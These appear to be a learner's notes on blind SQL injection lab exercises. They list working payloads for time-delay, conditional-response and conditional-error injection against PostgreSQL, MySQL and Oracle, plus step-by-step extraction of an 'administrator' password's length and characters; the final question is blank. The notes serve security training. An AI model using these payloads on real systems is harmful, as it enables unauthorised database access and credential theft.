Question 1  Time Delay
' || (SELECT sleep(10))--        -- My SQL doesn't Works
' || (SELECT pg_sleep(10))--     -- Postgres SQL Works

rurdakumarmishra@gmail.com




Question 2  Blind SQL injection with conditional responses
' and 1=1--  True (Works, its vulnerable to Blind SQL injection)
' and 1=2--  Flase(Works, its vulnerable to Blind SQL injection)
' and (select 'x' from users LIMIT 1)='x'--  (True Users table exist)

' and (select username from users where username='administrator')='administrator'--  (True 'administrator' user exist)

' and (select username from users where username='administrator' and length(password)>19)='administrator'--  (True length of password 19 characters)

Check Passwords---
' and (select substring(password,1,1) from users where username='administrator')='a'-- 





Question 3  Blind SQL injection with conditional error
' || (select '' from dual) || '   (Oracle Database)
' || (select '' from users where rownum=1) || '   (Users table exist)
' || (select '' from users where username='administrator') || '   ( 'administrator' user exist)
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || '  (password == 20chars)
 ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substring(password,1,1)='a') || '





Question 4  Blind SQL injection with time delays and information retrieval

' || pg_sleep(10)-- Vulnerable
' || (select case when (1=1) then pg_sleep(2) else pg_sleep(-1) end from users)--
' || (select case when (username='administrator') then pg_sleep(2) else pg_sleep(-1) end from users)--
' || (select case when (username='administrator' and length(password)=20) then pg_sleep(2) else pg_sleep(-1) end from users)--
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(2) else pg_sleep(-1) end from users)--




Question 5 Blind SQL injection with out-of-band interaction
















